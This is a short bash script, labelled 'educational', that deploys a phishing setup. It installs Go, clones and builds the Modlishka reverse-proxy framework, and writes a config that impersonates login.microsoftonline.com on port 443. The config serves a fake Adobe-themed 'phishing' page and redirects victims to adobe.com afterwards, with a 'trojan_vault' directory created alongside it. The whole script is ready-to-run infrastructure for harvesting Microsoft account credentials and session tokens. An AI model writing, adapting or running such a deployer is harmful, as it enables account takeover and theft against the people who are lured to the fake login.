#!/bin/bash
# 🏛️ TROJAN.SH - AUTOMATED DEPLOYER (EDUCATIONAL)
# -----------------------------------------------
GREEN='\033[0;32m'
NC='\033[0m'

echo -e "${GREEN}[+] Starting Trojan.sh Auto-Deploy...${NC}"

# 1. INSTALL SYSTEM CORE
sudo apt update && sudo apt install -y golang-go git make certbot byobu unzip

# 2. SETUP GO 1.24 (Required for Engine)
sudo add-apt-repository ppa:longsleep/golang-backports -y && sudo apt update
sudo apt install golang-1.24-go -y
sudo ln -sf /usr/lib/go-1.24/bin/go /usr/bin/go

# 3. DOWNLOAD & COMPILE ENGINE
cd /root
if [ ! -d "engine" ]; then
    git clone https://github.com/drk1wi/Modlishka.git engine
    cd engine && make && cd ..
fi

# 4. SETUP DIRECTORIES
mkdir -p /var/www/adobe_gui
mkdir -p /root/trojan_vault

# 5. CREATE MASTER CONFIG
cat << 'EOF' > /root/config.json
{
  "proxyDomain": "yourdomain.com",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "target": "login.microsoftonline.com",
  "terminateRedirectUrl": "https://www.adobe.com",
  "rules": [
    { "name": "gui", "target": "/", "phishing": "/", "type": "static", "path": "/var/www/adobe_gui/index.php" }
  ]
}
EOF

echo -e "${GREEN}[+] Trojan.sh is DEPLOYED. Run 'byobu' to start.${NC}"
